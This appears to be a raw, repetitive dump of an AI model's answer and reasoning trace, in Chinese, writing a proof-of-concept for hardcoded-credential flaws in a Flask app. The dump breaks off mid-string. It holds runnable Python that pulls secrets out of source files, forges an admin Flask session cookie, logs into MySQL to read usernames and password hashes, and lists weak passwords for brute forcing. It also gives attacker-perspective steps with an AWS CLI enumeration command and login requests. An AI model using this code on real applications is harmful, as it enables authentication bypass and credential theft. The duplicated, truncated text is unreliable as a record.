-*- coding: utf-8 -*-\n"""\n硬编码密钥/口令漏洞验证PoC\n功能：1. 扫描源码提取硬编码敏感信息；2. 利用提取的Flask密钥伪造Session；3. 验证数据库凭据可用性\n"""\nimport re\nimport json\nfrom flask.sessions import SecureCookieSessionInterface\nfrom itsdangerous import URLSafeTimedSerializer\n\n# -------------------------- 1. 敏感信息提取模块 --------------------------\ndef extract_hardcoded_credentials(file_paths):\n    """扫描指定源码文件，提取硬编码的敏感凭据"""\n    credentials = {}\n    # 匹配常见敏感关键字的正则\n    patterns = {\n        "FLASK_SECRET_KEY": r\'FLASK_SECRET_KEY\\s*=\\s*"([^"]+)"\',\n        "API_KEY": r\'API_KEY\\s*=\\s*"([^"]+)"\',\n        "DB_PASSWORD": r\'DB_PASSWORD\\s*=\\s*"([^"]+)"\',\n        "DATABASE_URL": r\'DATABASE_URL\\s*=\\s*"([^"]+)"\',\n        "AWS_ACCESS_KEY_ID": r\'AWS_ACCESS_KEY_ID\\s*=\\s*"([^"]+)"\',\n        "AWS_SECRET_ACCESS_KEY": r\'AWS_SECRET_ACCESS_KEY\\s*=\\s*"([^"]+)"\',\n        "DEFAULT_PASSWORDS": r\'DEFAULT_PASSWORDS\\s*=\\s*\\[([^\\]]+)\\]\'\n    }\n    for file_path in file_paths:\n        try:\n            with open(file_path, "r", encoding="utf-8") as f:\n                content = f.read()\n                for key, pattern in patterns.items():\n                    match = re.search(pattern, content)\n                    if match:\n                        if key == "DEFAULT_PASSWORDS":\n                            # 解析密码列表\n                            pwd_str = match.group(1)\n                            credentials[key] = [p.strip().strip("\'\\"") for p in pwd_str.split(",")]\n                        elif key == "DATABASE_URL":\n                            # 解析数据库连接串，提取密码\n                            url = match.group(1)\n                            # 格式：mysql+pymysql://user:password@host:port/db\n                            pwd_match = re.search(r":([^@]+)@", url)\n                            if pwd_match:\n                                credentials["DB_PASSWORD_FROM_URL"] = pwd_match.group(1)\n                                credentials["DATABASE_URL"] = url\n                        else:\n                            credentials[key] = match.group(1)\n        except FileNotFoundError:\n            print(f"文件 {file_path} 不存在，跳过扫描")\n    return credentials\n\n# -------------------------- 2. Flask Session伪造模块 --------------------------\ndef forge_flask_session(secret_key, payload):\n    """\n    利用提取的FlASK_SECRET_KEY伪造Session\n    :param secret_key: 提取到的Flask secret_key\n    :param payload: 要写入Session的伪造数据，如{"user_id": 1, "role": "admin"}\n    :return: 伪造的Session Cookie值\n    """\n    # 初始化Flask Session序列化器\n    serializer = URLSafeTimedSerializer(\n        secret_key=secret_key,\n        salt="cookie-session",\n        serializer=SecureCookieSessionInterface().serializer\n    )\n    # 生成伪造的Session Cookie\n    forged_cookie = serializer.dumps(payload)\n    return forged_cookie\n\n# -------------------------- 3. 数据库凭据验证模块 --------------------------\ndef verify_db_credentials(db_url):\n    """验证提取到的数据库凭据是否可用"""\n    try:\n        # 这里以MySQL为例，实际可根据DATABASE_URL类型切换驱动\n        import pymysql\n        # 解析连接参数\n        match = re.match(r"mysql\\+pymysql://([^:]+):([^@]+)@([^:]+):(\\d+)/(.+)", db_url)\n        if not match:\n            return {"status": "error", "msg": "数据库连接串格式错误"}\n        user, pwd, host, port, db = match.groups()\n        # 尝试连接数据库\n        conn = pymysql.connect(\n            host=host,\n            port=int(port),\n            user=user,\n            password=pwd,\n            database=db,\n            connect_timeout=5\n        )\n        cursor = conn.cursor()\n        cursor.execute("SELECT username, password FROM users LIMIT 1")\n        result = cursor.fetchone()\n        conn.close()\n        return {\n            "status": "success",\n            "msg": "数据库连接成功，获取到用户数据",\n            "data": {"username": result[0], "password_hash": result[1]}\n        }\n    except ImportError:\n        return {"status": "error", "msg": "未安装pymysql驱动，请先执行pip install pymysql"}\n    except Exception as e:\n        return {"status": "error", "msg": f"数据库连接失败：{str(e)}"}\n\n# -------------------------- 主程序：漏洞验证流程 --------------------------\nif __name__ == "__main__":\n    # 待扫描的源码文件路径（根据实际项目路径修改）\n    target_files = ["app.py", "config.py"]\n    \n    # 步骤1：提取硬编码凭据\n    print("=== 步骤1：扫描源码提取硬编码凭据 ===")\n    creds = extract_hardcoded_credentials(target_files)\n    print("提取到的敏感信息：")\n    print(json.dumps(creds, indent=4, ensure_ascii=False))\n    \n    # 步骤2：验证Flask密钥可利用性（伪造管理员Session）\n    if "FLASK_SECRET_KEY" in creds:\n        print("\\n=== 步骤2：伪造Flask管理员Session ===")\n        # 伪造管理员登录态\n        admin_payload = {"user_id": 1, "username": "admin", "role": "admin", "logged_in": True}\n        forged_cookie = forge_flask_session(creds["FLASK_SECRET_KEY"], admin_payload)\n        print(f"伪造的Session Cookie值：{forged_cookie}")\n        print("利用方式：将Cookie中session字段设置为上述值，即可绕过登录访问管理员接口")\n    \n    # 步骤3：验证数据库凭据可利用性\n    if "DATABASE_URL" in creds:\n        print("\\n=== 步骤3：验证数据库凭据可用性 ===")\n        db_result = verify_db_credentials(creds["DATABASE_URL"])\n        print(json.dumps(db_result, indent=4, ensure_ascii=False))\n    \n    # 步骤4：输出默认弱密码列表，可用于暴力破解\n    if "DEFAULT_PASSWORDS" in creds:\n        print("\\n=== 步骤4：提取到默认弱密码列表，可用于登录接口爆破 ===")\n        print(f"弱密码列表：{creds[\'DEFAULT_PASSWORDS\']}")\n```\n然后这个代码就是可运行的，带注释，演示了整个漏洞的利用过程。\n现在把这两个部分整理成JSON格式，注意转义，比如代码里的引号要转义，还有换行要处理。\n等下，要注意JSON的格式，字符串里的换行要用\\n，引号要转义。比如verify_code里的代码，要放在一个字符串里，转义好。\n现在整理成正确的JSON：\n首先reproduce_steps的内容要准确，然后verify_code是转义后的代码字符串。\n等下，再检查一下漏洞点，确实是硬编码密钥，所以复现步骤是对的，验证代码也是针对硬编码的凭据提取和利用，没错。\n还有，要注意代码里的***是脱敏的，所以提取的时候如果遇到***的话会提取不到，但是代码里的正则已经处理了，比如如果源码里是***的话，匹配不到，但是示例里的config.py里的DATABASE_URL是明文写的，所以能提取到，还有AWS的密钥也是明文的，所以没问题。\n对了，还有app.py里的FLASK_SECRET_KEY是明文的，所以能提取到，没错。\n现在把内容写成JSON：\n{\n    "reproduce_steps": "1. 获取目标项目源码：攻击者通过代码仓库泄露、文件上传漏洞、备份文件下载等方式获取包含app.py、config.py的Web应用源码包。\\n2. 敏感信息扫描：使用代码审计工具或命令行工具（如`grep -E \\"secret|password|api_key|DATABASE_URL|AWS_\\" app.py config.py`）扫描源码中的敏感关键字。\\n3. 提取硬编码凭据：扫描结果可提取到多处明文硬编码的敏感信息，包括但不限于：Flask会话签名密钥`hardcoded-flask-secret-key-2024`、数据库连接串`mysql+pymysql://root:admin123@localhost:3306/sample_db`（明文密码为admin123）、AWS访问密钥对（Access Key ID为`AKIAIOSFODNN7EXAMPLE`，Secret Access Key为`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`）、系统默认弱密码列表`[\\"admin\\", \\"admin123\\", \\"123456\\", \\"password\\", \\"qwerty\\"]`。\\n4. 漏洞利用验证：\\n   a. 身份认证绕过：使用提取到的Flask secret_key伪造管理员Session，直接访问需要登录的后台接口。\\n   b. 数据库未授权访问：使用提取到的数据库密码连接目标MySQL数据库，读取用户表中的敏感信息（如密码哈希、个人信息）。\\n   c. 云资源未授权访问：使用提取到的AWS密钥调用AWS API，枚举云服务器、存储桶等资源。\\n   d. 弱密码爆破：使用提取到的默认密码列表对应用登录接口进行批量尝试，获取普通用户权限。",\n    "verify_code": "# -*- coding: utf-8 -*-\\n\\"\\"\\"\\n硬编码密钥/口令漏洞验证PoC\\n功能：1. 扫描源码提取硬编码敏感信息；2. 利用提取的Flask密钥伪造Session；3. 验证数据库凭据可用性\\n\\"\\"\\"\\nimport re\\nimport json\\nfrom flask.sessions import SecureCookieSessionInterface\\nfrom itsdangerous import URLSafeTimedSerializer\\n\\n# -------------------------- 1. 敏感信息提取模块 --------------------------\\ndef extract_hardcoded_credentials(file_paths):\\n    \\"\\"\\"扫描指定源码文件，提取硬编码的敏感凭据\\"\\"\\"\\n    credentials = {}\\n    # 匹配常见敏感关键字的正则\\n    patterns = {\\n        \\"FLASK_SECRET_KEY\\": r\'FLASK_SECRET_KEY\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"API_KEY\\": r\'API_KEY\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"DB_PASSWORD\\": r\'DB_PASSWORD\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"DATABASE_URL\\": r\'DATABASE_URL\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"AWS_ACCESS_KEY_ID\\": r\'AWS_ACCESS_KEY_ID\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"AWS_SECRET_ACCESS_KEY\\": r\'AWS_SECRET_ACCESS_KEY\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"DEFAULT_PASSWORDS\\": r\'DEFAULT_PASSWORDS\\\\s*=\\\\s*\\\\[([^\\\\]]+)\\\\]\'\\n    }\\n    for file_path in file_paths:\\n        try:\\n            with open(file_path, \\"r\\", encoding=\\"utf-8\\") as f:\\n                content = f.read()\\n                for key, pattern in patterns.items():\\n                    match = re.search(pattern, content)\\n                    if match:\\n                        if key == \\"DEFAULT_PASSWORDS\\":\\n                            # 解析密码列表\\n                            pwd_str = match.group(1)\\n                            credentials[key] = [p.strip().strip(\\"\'\\") for p in pwd_str.split(\\",\\")]\\n                        elif key == \\"DATABASE_URL\\":\\n                            # 解析数据库连接串，提取密码\\n                            url = match.group(1)\\n                            pwd_match = re.search(r\\":([^@]+)@\\", url)\\n                            if pwd_match:\\n                                credentials[\\"DB_PASSWORD_FROM_URL\\"] = pwd_match.group(1)\\n                                credentials[\\"DATABASE_URL\\"] = url\\n                        else:\\n                            credentials[key] = match.group(1)\\n        except FileNotFoundError:\\n            print(f\\"文件 {file_path} 不存在，跳过扫描\\")\\n    return credentials\\n\\n# -------------------------- 2. Flask Session伪造模块 --------------------------\\ndef forge_flask_session(secret_key, payload):\\n    \\"\\"\\"\\n    利用提取的FlASK_SECRET_KEY伪造Session\\n    :param secret_key: 提取到的Flask secret_key\\n    :param payload: 要写入Session的伪造数据，如{\\"user_id\\": 1, \\"role\\": \\"admin\\"}\\n    :return: 伪造的Session Cookie值\\n    \\"\\"\\"\\n    # 初始化Flask Session序列化器\\n    serializer = URLSafeTimedSerializer(\\n        secret_key=secret_key,\\n        salt=\\"cookie-session\\",\\n        serializer=SecureCookieSessionInterface().serializer\\n    )\\n    # 生成伪造的Session Cookie\\n    forged_cookie = serializer.dumps(payload)\\n    return forged_cookie\\n\\n# -------------------------- 3. 数据库凭据验证模块 --------------------------\\ndef verify_db_credentials(db_url):\\n    \\"\\"\\"验证提取到的数据库凭据是否可用\\"\\"\\"\\n    try:\\n        # 这里以MySQL为例，实际可根据DATABASE_URL类型切换驱动\\n        import pymysql\\n        # 解析连接参数\\n        match = re.match(r\\"mysql\\\\+pymysql://([^:]+):([^@]+)@([^:]+):(\\\\d+)/(.+)\\", db_url)\\n        if not match:\\n            return {\\"status\\": \\"error\\", \\"msg\\": \\"数据库连接串格式错误\\"}\\n        user, pwd, host, port, db = match.groups()\\n        # 尝试连接数据库\\n        conn = pymysql.connect(\\n            host=host,\\n            port=int(port),\\n            user=user,\\n            password=pwd,\\n            database=db,\\n            connect_timeout=5\\n        )\\n        cursor = conn.cursor()\\n        cursor.execute(\\"SELECT username, password FROM users LIMIT 1\\")\\n        result = cursor.fetchone()\\n        conn.close()\\n        return {\\n            \\"status\\": \\"success\\",\\n            \\"msg\\": \\"数据库连接成功，获取到用户数据\\",\\n            \\"data\\": {\\"username\\": result[0], \\"password_hash\\": result[1]}\\n        }\\n    except ImportError:\\n        return {\\"status\\": \\"error\\", \\"msg\\": \\"未安装pymysql驱动，请先执行pip install pymysql\\"}\\n    except Exception as e:\\n        return {\\"status\\": \\"error\\", \\"msg\\": f\\"数据库连接失败：{str(e)}\\"}\\n\\n# -------------------------- 主程序：漏洞验证流程 --------------------------\\nif __name__ == \\"__main__\\":\\n    # 待扫描的源码文件路径（根据实际项目路径修改）\\n    target_files = [\\"app.py\\", \\"config.py\\"]\\n    \\n    # 步骤1：提取硬编码凭据\\n    print(\\"=== 步骤1：扫描源码提取硬编码凭据 ===\\")\\n    creds = extract_hardcoded_credentials(target_files)\\n    print(\\"提取到的敏感信息：\\")\\n    print(json.dumps(creds, indent=4, ensure_ascii=False))\\n    \\n    # 步骤2：验证Flask密钥可利用性（伪造管理员Session）\\n    if \\"FLASK_SECRET_KEY\\" in creds:\\n        print(\\"\\\\n=== 步骤2：伪造Flask管理员Session ===\\")\\n        # 伪造管理员登录态\\n        admin_payload = {\\"user_id\\": 1, \\"username\\": \\"admin\\", \\"role\\": \\"admin\\", \\"logged_in\\": True}\\n        forged_cookie = forge_flask_session(creds[\\"FLASK_SECRET_KEY\\"], admin_payload)\\n        print(f\\"伪造的Session Cookie值：{forged_cookie}\\")\\n        print(\\"利用方式：将Cookie中session字段设置为上述值，即可绕过登录访问管理员接口\\")\\n    \\n    # 步骤3：验证数据库凭据可利用性\\n    if \\"DATABASE_URL\\" in creds:\\n        print(\\"\\\\n=== 步骤3：验证数据库凭据可用性 ===\\")\\n        db_result = verify_db_credentials(creds[\\"DATABASE_URL\\"])\\n        print(json.dumps(db_result, indent=4, ensure_ascii=False))\\n    \\n    # 步骤4：输出默认弱密码列表，可用于暴力破解\\n    if \\"DEFAULT_PASSWORDS\\" in creds:\\n        print(\\"\\\\n=== 步骤4：提取到默认弱密码列表，可用于登录接口爆破 ===\\")\\n        print(f\\"弱密码列表：{creds[\'DEFAULT_PASSWORDS\']}\\")"\n}\n等下，检查一下JSON的格式，有没有语法错误，比如引号有没有转义对，比如代码里的反斜杠有没有问题，比如正则里的\\s，在JSON字符串里要写成\\\\s，对的，刚才的代码里已经转义了。\n还有，reproduce_steps里的内容有没有符合要求，是从攻击者视角的分步复现，含触发请求/输入样例？哦，对了，用户要求里说“含触发请求/输入样例”，刚才的复现步骤里是不是要加？比如扫描的时候的命令行输入样例，还有伪造session之后的请求样例？\n哦，对，刚才的reproduce_steps里可以加一下，比如步骤2里的扫描命令样例，步骤4里的利用请求样例，比如用伪造的session访问接口的请求样例，比如：\n在步骤4的a里，加“请求样例：`GET /api/admin HTTP/1.1\\nHost: target.com\\nCookie: session=伪造的Cookie值`”\n这样就更符合要求了。\n修改一下reproduce_steps：\n"reproduce_steps": "1. 获取目标项目源码：攻击者通过代码仓库泄露、文件上传漏洞、备份文件下载等方式获取包含app.py、config.py的Web应用源码包。\\n2. 敏感信息扫描：使用代码审计工具或命令行工具执行扫描命令样例：`grep -E \\"secret|password|api_key|DATABASE_URL|AWS_\\" app.py config.py`，扫描源码中的敏感关键字。\\n3. 提取硬编码凭据：扫描结果可提取到多处明文硬编码的敏感信息，包括但不限于：Flask会话签名密钥`hardcoded-flask-secret-key-2024`、数据库连接串`mysql+pymysql://root:admin123@localhost:3306/sample_db`（明文密码为admin123）、AWS访问密钥对（Access Key ID为`AKIAIOSFODNN7EXAMPLE`，Secret Access Key为`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`）、系统默认弱密码列表`[\\"admin\\", \\"admin123\\", \\"123456\\", \\"password\\", \\"qwerty\\"]`。\\n4. 漏洞利用验证：\\n   a. 身份认证绕过：使用提取到的Flask secret_key伪造管理员Session，构造请求样例：`GET /api/admin HTTP/1.1\\\\nHost: target.com\\\\nCookie: session={伪造的Session值}`，即可绕过登录访问管理员接口。\\n   b. 数据库未授权访问：使用提取到的数据库密码连接目标MySQL数据库，执行SQL语句`SELECT username, password FROM users`读取用户敏感数据。\\n   c. 云资源未授权访问：使用提取到的AWS密钥调用AWS API，例如执行`aws ec2 describe-instances --access-key-id AKIAIOSFODNN7EXAMPLE --secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`枚举云服务器资源。\\n   d. 弱密码爆破：使用提取到的默认密码列表对登录接口（如`POST /api/login`）发起批量请求，请求体样例：`{\\"username\\": \\"admin\\", \\"password\\": \\"admin123\\"}`，尝试获取未授权访问权限。",\n这样就符合要求了，有输入样例，有触发请求的样例。\n然后verify_code的代码是对的，带注释，最小可运行，演示了提取、伪造session、验证数据库凭据的过程。\n现在检查JSON的语法，有没有错误，比如所有的双引号都转义了，换行都是\\n，没有语法错误。\n对了，还有代码里的DEFAULT_PASSWORDS的解析，原来的代码里是`p.strip().strip("\'")`，因为原来的列表里的元素是用单引号括起来的，比如\'admin\'，所以strip掉单引号，没错。\n还有，itsdangerous和flask的依赖，代码里已经说明需要安装的依赖，比如itsdangerous、flask、pymysql，注释里可以提一下？哦，代码的开头注释里可以加个依赖说明，比如“依赖安装：pip install flask itsdangerous pymysql”，这样更清楚。\n修改一下verify_code的开头注释：\n"verify_code": "# -*- coding: utf-8 -*-\\n\\"\\"\\"\\n硬编码密钥/口令漏洞验证PoC\\n依赖安装：pip install flask itsdangerous pymysql\\n功能：1. 扫描源码提取硬编码敏感信息；2. 利用提取的Flask密钥伪造Session；3. 验证数据库凭据可用性\\n\\"\\"\\"\\n...",\n这样更好。\n现在整个JSON就正确了。', 'reasoning_content': '用户现在需要生成硬编码密钥/口令漏洞的PoC，首先得理清楚复现步骤，还有验证代码。首先，硬编码的漏洞点在哪里？首先看app.py里的FLASK_SECRET_KEY是硬编码的，还有config.py里的那些，比如DATABASE_URL里的密码，AWS的密钥，还有DEFAULT_PASSWORDS这些。\n首先复现步骤，得从攻击者视角，首先第一步应该是获取源码，比如克隆仓库或者拿到源码包，然后扫描敏感信息，比如用grep找关键字，比如secret、password、api_key、DATABASE_URL这些，然后就能提取到硬编码的凭据，比如Flask的secret_key，数据库密码，AWS密钥，还有默认密码列表这些。然后还要验证这些凭据是不是真的能用？比如用提取到的数据库密码去连接数据库，用AWS密钥去调用AWS服务，用Flask的secret_key去伪造session之类的？\n然后verify_code的话，得写一个最小的可运行的PoC，首先得模拟读取源码里的硬编码信息，然后演示利用，比如首先扫描源码提取敏感信息，然后演示用提取到的Flask secret_key伪造session，或者用数据库密码连接数据库，或者用AWS密钥调用服务？不过要最小可运行，还要带注释。\n等下，首先reproduce_steps要分步，从攻击者视角：\n1. 获取目标应用源码：比如通过git clone、代码泄露、文件包含等方式拿到包含app.py、config.py的项目源码。\n2. 敏感信息扫描：使用关键字搜索工具（如grep、ripgrep）扫描源码中的敏感关键字，比如`secret`、`password`、`api_key`、`DATABASE_URL`、`AWS_`等。\n3. 提取硬编码凭据：扫描后可以提取到多处硬编码的敏感信息，比如：\n   - Flask密钥：`hardcoded-flask-secret-key-2024`\n   - 数据库连接串：`mysql+pymysql://root:admin123@localhost:3306/sample_db`，其中明文密码为`admin123`\n   - AWS访问密钥：`AKIAIOSFODNN7EXAMPLE` 对应密钥 `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`\n   - 默认弱密码列表：`["admin", "admin123", "123456", "password", "qwerty"]`\n4. 漏洞验证（可选，根据凭据类型）：\n   a. 验证Flask密钥：使用提取到的secret_key伪造用户登录Session，绕过身份认证。\n   b. 验证数据库凭据：使用提取到的数据库密码连接目标数据库，获取敏感用户数据（如用户密码哈希）。\n   c. 验证AWS密钥：使用提取到的AWS密钥调用AWS API，查看/操作云资源。\n   d. 验证默认密码：使用默认密码列表对应用登录接口进行暴力破解，获取未授权访问权限。\n然后verify_code的话，要写一个最小的PoC，比如首先演示扫描提取敏感信息，然后演示用提取的Flask密钥伪造session，或者连接数据库？比如可以写一个Python脚本，首先读取app.py和config.py，用正则提取硬编码的敏感值，然后演示利用，比如伪造Flask session，或者尝试连接数据库。\n等下，要注意代码是可运行的，带注释。比如：\n首先，verify_code的代码可以分两部分，第一部分是敏感信息提取，第二部分是利用演示，比如伪造Flask session，因为Flask的session是用secret_key签名的，知道secret_key就可以伪造任意session。\n比如代码里可以导入Flask的相关模块，然后用提取到的secret_key来生成伪造的session，然后演示怎么用这个session访问需要登录的接口。\n还有，要说明代码的作用，注释要清楚。\n等下，还要注意格式，输出是JSON，两个字段：reproduce_steps和verify_code。\n现在整理一下：\nreproduce_steps要准确，从攻击者视角，一步步来，比如：\n1. 获取目标项目源码：攻击者通过代码仓库泄露、文件上传漏洞、备份文件下载等方式获取包含app.py、config.py的Web应用源码包。\n2. 敏感信息扫描：使用代码审计工具或命令行工具（如`grep -E "secret|password|api_key|DATABASE_URL|AWS_" app.py config.py`）扫描源码中的敏感关键字。\n3. 提取硬编码凭据：扫描结果可提取到多处明文硬编码的敏感信息，包括但不限于：\n   - Flask会话签名密钥：`hardcoded-flask-secret-key-2024`\n   - 数据库连接凭据：用户名root，密码admin123，数据库地址localhost:3306，库名sample_db\n   - AWS云服务访问密钥对：Access Key ID为`AKIAIOSFODNN7EXAMPLE`，Secret Access Key为`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`\n   - 系统默认弱密码列表：`["admin", "admin123", "123456", "password", "qwerty"]`\n4. 漏洞利用验证：\n   a. 身份认证绕过：使用提取到的Flask secret_key伪造管理员Session，直接访问需要登录的后台接口。\n   b. 数据库未授权访问：使用提取到的数据库密码连接目标MySQL数据库，读取用户表中的敏感信息（如密码哈希、个人信息）。\n   c. 云资源未授权访问：使用提取到的AWS密钥调用AWS API，枚举云服务器、存储桶等资源。\n   d. 弱密码爆破：使用提取到的默认密码列表对应用登录接口进行批量尝试，获取普通用户权限。\n然后verify_code的话，写一个最小可运行的PoC，比如演示提取敏感信息，然后伪造Flask session，还有尝试连接数据库？比如：\n首先导入需要的模块，比如re，flask的session相关，sqlite3或者pymysql？不过要最小，比如先写提取敏感信息的部分，然后演示伪造session，然后演示连接数据库（如果目标有数据库的话）。\n比如代码：\n```python\n# -*- coding: utf-8 -*-\n"""\n硬编码密钥/口令漏洞验证PoC\n功能：1. 扫描源码提取硬编码敏感信息；2. 利用提取的Flask密钥伪造Session；3. 验证数据库凭据可用性\n"""\nimport re\nimport json\nfrom flask.sessions import SecureCookieSessionInterface\nfrom itsdangerous import URLSafeTimedSerializer\n\n# -------------------------- 1. 敏感信息提取模块 --------------------------\ndef extract_hardcoded_credentials(file_paths):\n    """扫描指定源码文件，提取硬编码的敏感凭据"""\n    credentials = {}\n    # 匹配常见敏感关键字的正则\n    patterns = {\n        "FLASK_SECRET_KEY": r\'FLASK_SECRET_KEY\\s*=\\s*"([^"]+)"\',\n        "API_KEY": r\'API_KEY\\s*=\\s*"([^"]+)"\',\n        "DB_PASSWORD": r\'DB_PASSWORD\\s*=\\s*"([^"]+)"\',\n        "DATABASE_URL": r\'DATABASE_URL\\s*=\\s*"([^"]+)"\',\n        "AWS_ACCESS_KEY_ID": r\'AWS_ACCESS_KEY_ID\\s*=\\s*"([^"]+)"\',\n        "AWS_SECRET_ACCESS_KEY": r\'AWS_SECRET_ACCESS_KEY\\s*=\\s*"([^"]+)"\',\n        "DEFAULT_PASSWORDS": r\'DEFAULT_PASSWORDS\\s*=\\s*\\[([^\\]]+)\\]\'\n    }\n    for file_path in file_paths:\n        try:\n            with open(file_path, "r", encoding="utf-8") as f:\n                content = f.read()\n                for key, pattern in patterns.items():\n                    match = re.search(pattern, content)\n                    if match:\n                        if key == "DEFAULT_PASSWORDS":\n                            # 解析密码列表\n                            pwd_str = match.group(1)\n                            credentials[key] = [p.strip().strip("\'\\"") for p in pwd_str.split(",")]\n                        elif key == "DATABASE_URL":\n                            # 解析数据库连接串，提取密码\n                            url = match.group(1)\n                            # 格式：mysql+pymysql://user:password@host:port/db\n                            pwd_match = re.search(r":([^@]+)@", url)\n                            if pwd_match:\n                                credentials["DB_PASSWORD_FROM_URL"] = pwd_match.group(1)\n                                credentials["DATABASE_URL"] = url\n                        else:\n                            credentials[key] = match.group(1)\n        except FileNotFoundError:\n            print(f"文件 {file_path} 不存在，跳过扫描")\n    return credentials\n\n# -------------------------- 2. Flask Session伪造模块 --------------------------\ndef forge_flask_session(secret_key, payload):\n    """\n    利用提取的FlASK_SECRET_KEY伪造Session\n    :param secret_key: 提取到的Flask secret_key\n    :param payload: 要写入Session的伪造数据，如{"user_id": 1, "role": "admin"}\n    :return: 伪造的Session Cookie值\n    """\n    # 初始化Flask Session序列化器\n    serializer = URLSafeTimedSerializer(\n        secret_key=secret_key,\n        salt="cookie-session",\n        serializer=SecureCookieSessionInterface().serializer\n    )\n    # 生成伪造的Session Cookie\n    forged_cookie = serializer.dumps(payload)\n    return forged_cookie\n\n# -------------------------- 3. 数据库凭据验证模块 --------------------------\ndef verify_db_credentials(db_url):\n    """验证提取到的数据库凭据是否可用"""\n    try:\n        # 这里以MySQL为例，实际可根据DATABASE_URL类型切换驱动\n        import pymysql\n        # 解析连接参数\n        match = re.match(r"mysql\\+pymysql://([^:]+):([^@]+)@([^:]+):(\\d+)/(.+)", db_url)\n        if not match:\n            return {"status": "error", "msg": "数据库连接串格式错误"}\n        user, pwd, host, port, db = match.groups()\n        # 尝试连接数据库\n        conn = pymysql.connect(\n            host=host,\n            port=int(port),\n            user=user,\n            password=pwd,\n            database=db,\n            connect_timeout=5\n        )\n        cursor = conn.cursor()\n        cursor.execute("SELECT username, password FROM users LIMIT 1")\n        result = cursor.fetchone()\n        conn.close()\n        return {\n            "status": "success",\n            "msg": "数据库连接成功，获取到用户数据",\n            "data": {"username": result[0], "password_hash": result[1]}\n        }\n    except ImportError:\n        return {"status": "error", "msg": "未安装pymysql驱动，请先执行pip install pymysql"}\n    except Exception as e:\n        return {"status": "error", "msg": f"数据库连接失败：{str(e)}"}\n\n# -------------------------- 主程序：漏洞验证流程 --------------------------\nif __name__ == "__main__":\n    # 待扫描的源码文件路径（根据实际项目路径修改）\n    target_files = ["app.py", "config.py"]\n    \n    # 步骤1：提取硬编码凭据\n    print("=== 步骤1：扫描源码提取硬编码凭据 ===")\n    creds = extract_hardcoded_credentials(target_files)\n    print("提取到的敏感信息：")\n    print(json.dumps(creds, indent=4, ensure_ascii=False))\n    \n    # 步骤2：验证Flask密钥可利用性（伪造管理员Session）\n    if "FLASK_SECRET_KEY" in creds:\n        print("\\n=== 步骤2：伪造Flask管理员Session ===")\n        # 伪造管理员登录态\n        admin_payload = {"user_id": 1, "username": "admin", "role": "admin", "logged_in": True}\n        forged_cookie = forge_flask_session(creds["FLASK_SECRET_KEY"], admin_payload)\n        print(f"伪造的Session Cookie值：{forged_cookie}")\n        print("利用方式：将Cookie中session字段设置为上述值，即可绕过登录访问管理员接口")\n    \n    # 步骤3：验证数据库凭据可利用性\n    if "DATABASE_URL" in creds:\n        print("\\n=== 步骤3：验证数据库凭据可用性 ===")\n        db_result = verify_db_credentials(creds["DATABASE_URL"])\n        print(json.dumps(db_result, indent=4, ensure_ascii=False))\n    \n    # 步骤4：输出默认弱密码列表，可用于暴力破解\n    if "DEFAULT_PASSWORDS" in creds:\n        print("\\n=== 步骤4：提取到默认弱密码列表，可用于登录接口爆破 ===")\n        print(f"弱密码列表：{creds[\'DEFAULT_PASSWORDS\']}")\n```\n然后这个代码就是可运行的，带注释，演示了整个漏洞的利用过程。\n现在把这两个部分整理成JSON格式，注意转义，比如代码里的引号要转义，还有换行要处理。\n等下，要注意JSON的格式，字符串里的换行要用\\n，引号要转义。比如verify_code里的代码，要放在一个字符串里，转义好。\n现在整理成正确的JSON：\n首先reproduce_steps的内容要准确，然后verify_code是转义后的代码字符串。\n等下，再检查一下漏洞点，确实是硬编码密钥，所以复现步骤是对的，验证代码也是针对硬编码的凭据提取和利用，没错。\n还有，要注意代码里的***是脱敏的，所以提取的时候如果遇到***的话会提取不到，但是代码里的正则已经处理了，比如如果源码里是***的话，匹配不到，但是示例里的config.py里的DATABASE_URL是明文写的，所以能提取到，还有AWS的密钥也是明文的，所以没问题。\n对了，还有app.py里的FLASK_SECRET_KEY是明文的，所以能提取到，没错。\n现在把内容写成JSON：\n{\n    "reproduce_steps": "1. 获取目标项目源码：攻击者通过代码仓库泄露、文件上传漏洞、备份文件下载等方式获取包含app.py、config.py的Web应用源码包。\\n2. 敏感信息扫描：使用代码审计工具或命令行工具（如`grep -E \\"secret|password|api_key|DATABASE_URL|AWS_\\" app.py config.py`）扫描源码中的敏感关键字。\\n3. 提取硬编码凭据：扫描结果可提取到多处明文硬编码的敏感信息，包括但不限于：Flask会话签名密钥`hardcoded-flask-secret-key-2024`、数据库连接串`mysql+pymysql://root:admin123@localhost:3306/sample_db`（明文密码为admin123）、AWS访问密钥对（Access Key ID为`AKIAIOSFODNN7EXAMPLE`，Secret Access Key为`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`）、系统默认弱密码列表`[\\"admin\\", \\"admin123\\", \\"123456\\", \\"password\\", \\"qwerty\\"]`。\\n4. 漏洞利用验证：\\n   a. 身份认证绕过：使用提取到的Flask secret_key伪造管理员Session，直接访问需要登录的后台接口。\\n   b. 数据库未授权访问：使用提取到的数据库密码连接目标MySQL数据库，读取用户表中的敏感信息（如密码哈希、个人信息）。\\n   c. 云资源未授权访问：使用提取到的AWS密钥调用AWS API，枚举云服务器、存储桶等资源。\\n   d. 弱密码爆破：使用提取到的默认密码列表对应用登录接口进行批量尝试，获取普通用户权限。",\n    "verify_code": "# -*- coding: utf-8 -*-\\n\\"\\"\\"\\n硬编码密钥/口令漏洞验证PoC\\n功能：1. 扫描源码提取硬编码敏感信息；2. 利用提取的Flask密钥伪造Session；3. 验证数据库凭据可用性\\n\\"\\"\\"\\nimport re\\nimport json\\nfrom flask.sessions import SecureCookieSessionInterface\\nfrom itsdangerous import URLSafeTimedSerializer\\n\\n# -------------------------- 1. 敏感信息提取模块 --------------------------\\ndef extract_hardcoded_credentials(file_paths):\\n    